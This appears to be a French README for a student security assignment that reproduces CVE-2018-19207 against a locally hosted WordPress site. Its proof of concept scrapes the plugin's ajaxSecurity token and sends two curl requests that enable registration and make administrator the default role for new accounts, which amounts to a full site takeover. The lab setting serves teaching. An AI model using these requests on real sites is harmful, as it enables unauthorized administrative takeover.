# SDSI
Devoir 2 - Faille CVE-2018-19207

## Démarrer les containers
```
docker-compose up
```

## Configuration de wordpress
1. Se connecter au site via `http://localhost:8000/`
2. Créer le compte administrateur
3. Activer le plugin "WP GDPR Compliance" via `http://localhost:8000/wp-admin/plugins.php` puis "Activate"

## PoC (WIP)

1. Se connecter sur le home du site

Requête GET à `http://localhost:8000/` pour obtenir le token `ajaxSecurity` utilisé par le plugin
```
curl -X GET http://localhost:8000/ | grep "ajaxSecurity"
```

2. Autoriser la création de nouveaux utilisateurs

Si on demande à s'enregistrer sur le site via la page `http://localhost:8000/wp-login.php?action=register`, on peut voir le message d'erreur suivant "User registration is currently not allowed."

Requête POST à `http://localhost:8000/wp-admin/admin-ajax.php`
Paramètres: action=wpgdprc_process_action&security=AJAXSECURITYTOKEN&data ={"type": "save_setting", "append": "false", "option": "users_can_register", "value": "1"}

```
curl -H "Content-Type: application/x-www-form-urlencoded" -d "action=wpgdprc_process_action&security=AJAXSECURITYTOKEN&data=%7B%22type%22%3A%22save_setting%22%2C%22append%22%3Afalse%2C%22option%22%3A%22users_can_register%22%2C%22value%22%3A%221%22%7D" -X POST http://localhost:8000/wp-admin/admin-ajax.php
```

En accédant à nouveau à `http://localhost:8000/wp-login.php?action=register`,
on peut remarquer qu'on peut désormais se créer un compte sur le site.

3. Obtenir les droits administateur

Requête POST à `http://localhost:8000/wp-admin/admin-ajax.php`
Paramètres: action=wpgdprc_process_action&security=AJAXSECURITYTOKEN&data ={"type": "save_setting", "append": "false","option": "default_role", "value": "administrator"}

```
curl -H "Content-Type: application/x-www-form-urlencoded" -d "action=wpgdprc_process_action&security=AJAXSECURYTOKEN&data=%7B%22type%22%3A%22save_setting%22%2C%22append%22%3Afalse%2C%22option%22%3A%22default_role%22%2C%22value%22%3A%22administrator%22%7D" -X POST http://localhost:8000/wp-admin/admin-ajax.php
```
Le but de cette requête est de faire en sorte que tous les nouveaux utilisateurs qui s'enregistrent sur le site auront les droits administrateurs par défaut.

4. Créer un compte via `http://localhost:8000/wp-login.php?action=register`, puis se connecter via `http://localhost:8000/wp-login.php` après vérification de l'adresse email.

Pour aller plus vite, vous pouvez vous connecter grâce au compte admin initial. Dans l'onglet "Users", vous pourrez voir le nouveau compte que vous avez créé avec le rôle "Administrator".

Vous pouvez aussi vérifier dans l'onglet "Settings" > "General" les paramètres "Membership" (la case "Anyone can register" devrait être cochée) et "New User Default Role" (à "Administrator").
